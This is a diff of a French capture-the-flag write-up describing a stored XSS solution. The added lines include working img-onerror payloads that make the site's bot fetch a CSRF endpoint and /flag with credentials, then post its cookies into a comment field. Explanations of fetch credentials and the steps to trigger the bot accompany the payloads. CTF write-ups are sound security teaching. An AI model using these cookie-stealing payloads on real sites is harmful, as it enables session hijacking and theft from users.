@@ -94,12 +94,13 @@ Pour cela nous allons utiliser fetch et le langage Javascript. Je vous invite à
 
 https://developer.mozilla.org/fr/docs/Web/API/Fetch_API/Using_Fetch
 
-
+Vous y trouverez toutes les informations liée à fetch notamment le 
 
 Solution finale : 
 
 ```javascript
-<img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(()=>fetch('/flag',{credentials:'include'})).then(()=>{var c=document.cookie;fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=AFTER='+encodeURIComponent(c)})})"><img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(r=>{var sc=r.headers.get('set-cookie');fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=SC='+encodeURIComponent(sc)})})">
+<img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(()=>fetch('/flag',{credentials:'include'})).then(()=>{var flag_cookie=document.cookie;fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=FLAG='+encodeURIComponent(flag_cookie)})})">
+<img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(request=>{var flag_cookie=request.headers.get('set-cookie');fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=FLAG='+encodeURIComponent(flag_cookie)})})">
 ```
 
 
@@ -112,7 +113,29 @@ Le bon payload pour la solution finale est la suivante :
 "><img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(()=>fetch('/flag',{credentials:'include'})).then(()=>{var flag_cookie=document.cookie;fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=FLAG='+encodeURIComponent(flag_cookie)})})"></img>
 ```
 
-Dans ce payload on crée une image qui n'as pas de source toujours pour faire en sorte que ça passe à l'execution du oneerror, lorsque cela est fait on récupère les informations du fichier /api/init_csrf donc le token CSRF du bot, on récupere c'est credentials quand cela est fait on récupere les information de la page /flag qui lui modifie le cookie du bot avec celui du flag/
+Dans ce payload on crée une image qui n'as pas de source toujours pour faire en sorte que ça passe à l'execution du oneerror, lorsque cela est fait on récupère les informations du fichier /api/init_csrf donc le token CSRF du bot, on récupere c'est credentials quand cela est fait on récupere les information de la page /flag qui lui modifie le cookie du bot avec celui du flag
+
+Mais qu'est-ce que les credentials ? c'est "une preuve d'identité par exemple un mot de passe, des données biométrique ou autre. vous pouvez retrouver.  
+
+Dans le cadre de l'API Fetch, un identifiant est une donnée supplémentaire envoyée avec la requête et que le serveur peut utiliser pour authentifier l'utilisateur. Tous les éléments suivants sont considérés comme des identifiants
+- HTTP cookies
+- [TLS](https://developer.mozilla.org/en-US/docs/Glossary/TLS) client certificates
+- The [`Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Authorization) and [`Proxy-Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Proxy-Authorization) headers.
+
+Pour plus d'information : 
+
+https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#including_credentials
+
+
+
+
+Pour le code du POST j'ai repris les grands principes qui sont aussi dans le lien : 
+
+![](../img/Pasted%20image%2020260517181943.png)
+
+Si certains ce pose la question pourquoi j'ai mis "Content-Type" : "application/x-www-form-urlencoded" car c'est ce type de contenu qui faut mettre lorsqu'on fait un Content-Type via cette méthode.
+
+
 
 Et enfin on POST toute c'est informations dans les dépêche en créant une requête POST vers la page /post_comment qui est là où tout les dépêches passe pour savoir si l'utilisateur à bel est bien un token csrf si ce n'est pas le cas nous obtenons une erreur. 
 
@@ -130,4 +153,15 @@ Pour voir si c'est bien dans le /post_comment qu'il faut renvoyer nous allons ut
 ![](../img/Pasted%20image%2020260517173703.png)
 
 
-On peut voir qu'on à été redirigé vers la racine du site donc on à bel est bien post
+On peut voir qu'on à été redirigé vers la racine du site donc on à bel est bien post. 
+
+Lançon maintenant notre payload finale. 
+
+![](../img/Pasted%20image%2020260517182547.png)
+
+
+Cliquez sur envoyer la Dépêche puis sur Signaler un problème en bas de la page et rechargé la page.
+
+![](../img/Pasted%20image%2020260517182636.png)
+
+Bingo ! 
